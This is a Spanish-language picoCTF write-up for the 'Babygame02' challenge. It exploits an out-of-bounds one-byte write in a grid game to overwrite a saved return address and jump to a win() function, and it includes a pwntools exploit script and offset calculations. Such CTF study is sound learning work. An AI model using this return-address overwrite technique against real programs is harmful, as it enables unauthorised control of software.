---
title: "Babygame02"
date: "2025-12-14"
tags: ["picoCTF", "OOB"]
---

Nos dan un binario sin su código. 

```c
file game
game: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a78466abe166810914fe43e5bd71533071ad919e, for GNU/Linux 3.2.0, not stripped

pwndbg> checksec
File:     /home/ub1cu0/Escritorio/PWN/picoCTF/babygame02/game
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

Como podemos ver solo tiene NX. Vamos a mirar su funcionamiento:

```c
Player position: 4 4
End tile position: 29 89
...........................................................................................................................................................................................................................................................................................................................................................................@...........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
.......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................X
```

Es un juego donde escribiendo 'w', 'a', 's' y 'd' podemos movernos. Si movemos nuestro personaje (@) a la X pondrá "You Win!". 

Vamos a decompilar el código para ver cosas ocultas. Estan son las cosas que he encontrado:

1. El array tablero con todo lo que tiene dentro se guarda en el stack
2. Si ponemos `l` seguido de un símbolo, cambiará el ascii del player.

```c
void move_player(player *player,char input,tableroStruct *tablero)

{
  int iVar1;
  
  if (input == 'l') {
    iVar1 = getchar();
    player_tile = (char)iVar1;
  }
  if (input == 'p') {
    solve_round(tablero,player);
  }
  tablero->casillas[player->pos_X][player->pos_Y] = '.';
  if (input == 'w') {
    player->pos_X = player->pos_X + -1;
  }
  else if (input == 's') {
    player->pos_X = player->pos_X + 1;
  }
  else if (input == 'a') {
    player->pos_Y = player->pos_Y + -1;
  }
  else if (input == 'd') {
    player->pos_Y = player->pos_Y + 1;
  }
  tablero->casillas[player->pos_X][player->pos_Y] = player_tile;
  return;
}
```

3. No hay limite negativo ni positivo en donde puede estar el jugador

Gracias a esto podemos saber que tenemos un arbitrary write de 1 byte. Gracias a la opción l para elegir que escribir y el OOB para decir donde. Que podemos sobreescribir? Podemos intentar sobreescribir la dirección de retorno. Pero donde queremos saltar? He encontrado la siguiente función win:

```c
void win(void)

{
  char local_4c [60];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("flag.txt not found in current directory");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_4c,0x3c,local_10);
  printf(local_4c);
  return;
}
```

Si miramos las direcciones de las funciones, y el stack, podemos ver lo siguiente:

```c
0x0804975d    3    131 sym.wins
```

```c
05:0014│-004   0xffffc4c4 —▸ 0xffffd05c —▸ 0xffffd1eb ◂— 'SHELL=/bin/bash'
06:0018│ ebp   0xffffc4c8 —▸ 0xffffcf88 ◂— 0
07:001c│+004   0xffffc4cc —▸ 0x8049709 (main+149) ◂— add esp, 0x1
```

Vemos que entre la dirección de la direccion de retorno en el stack frame de la función `move_player` y la dirección `win` solo hay 1 byte de diferencia:

```c
0x80497 09 y 0x080497 5d
```

Entonces, si usamos el arbitrary write para tocar esa dirección de retorno y cambiar el ultimo byte por `win` tendríamos la flag.

Primero vamos a calcular el offset para saber donde tenemos que poner al player:

```c
 ebp   0xffffc4c8 —▸ 0xffffcf88 ◂— 0
+004   0xffffc4cc —▸ 0x8049709 (main+149) ◂— add esp, 0x10
+008   0xffffc4d0 —▸ 0xffffc4e8 ◂— 4
+00c   0xffffc4d4 ◂— 0x64 /* 'd' */
+010   0xffffc4d8 —▸ 0xffffc4f3 ◂— 0x2e2e2e2e ('....')
```

El telescope nos da todo lo que necesitamos. Gracias a eso sabemos que:

1. El tablero empieza en la dirección `0xffffc4f3`
2. Queremos modificar el contenido en la dirección `0xffffc4cc`

Entonces, asumiendo que nuestro player esté en la posicion 0,0:

```c
pwndbg> x 0xffffc4f3 - 0xffffc4cc
0x27:   Cannot access memory at address 0x27
```

Tenemos que poner al jugador 0x27 (39) bytes en negativo para llegar al byte que queremos.

Podemos hacer el exploit ya:

```python
from pwn import *

exe = './game'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

io.recvline(b'X\n')
io.sendline(b'aaaa')

io.recvline(b'X\n')
io.sendline(b'wwww')

# Lo anterior es para poner al player en la posición 0,0.

io.recvline(b'X\n')
io.sendline(b'l]') # ] en ascii es 0x5d en hex. El cual es el ultimo byte de win

io.recvline(b'X\n')
io.sendline(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') # 39 'a's


io.interactive()
```

Sin embargo, aunque todo pinte bien, no va a ir. Esto pasa porque en el camino nos estamos cargando algo importante y nos comeremos un Segmentation Fault:

```c
Program received signal SIGSEGV, Segmentation fault.
0x080494ca in move_player ()
```

Para solucionar esto podemos añadir una 'w' mas y luego una 's' para intentar evadir el byte corrompido en el camino que nos rompe el programa. (Esto lo saqué gracias a un writeup por que no se me ocurrió) https://blog.ry4n.org/babygame02-picoctf-writeup-6bf57b54f7b3

Con este cambio podremos ver la flag:

```
..........................................................................................
..........................................................................................
.........................................................................................X
FLAG
```

## Aviso

En remoto no funcionará. Esto se soluciona haciendo que el programa salte un poquito mas adelante que la función win, como por ejemplo alguna de estas:

```nasm
			0x0804975d      55             push ebp
│           0x0804975e      89e5           mov ebp, esp
│           0x08049760      53             push ebx
│           0x08049761      83ec44         sub esp, 0x44
│           0x08049764      e8d7f9ffff     call sym.__x86.get_pc_thunk.bx
│           0x08049769      81c397280000   add ebx, 0x2897
│           0x0804976f      90             nop
│           0x08049770      90             nop
│           0x08049771      90             nop
│           0x08049772      90             nop
│           0x08049773      90             nop
│           0x08049774      90             nop
│           0x08049775      90             nop
│           0x08049776      90             nop
│           0x08049777      90             nop
│           0x08049778      90             nop
│           0x08049779      83ec08         sub esp, 8
│           0x0804977c      8d8348e0ffff   lea eax, [ebx - 0x1fb8]
```

En este caso, la única que he probado y funciona es `0x08049760`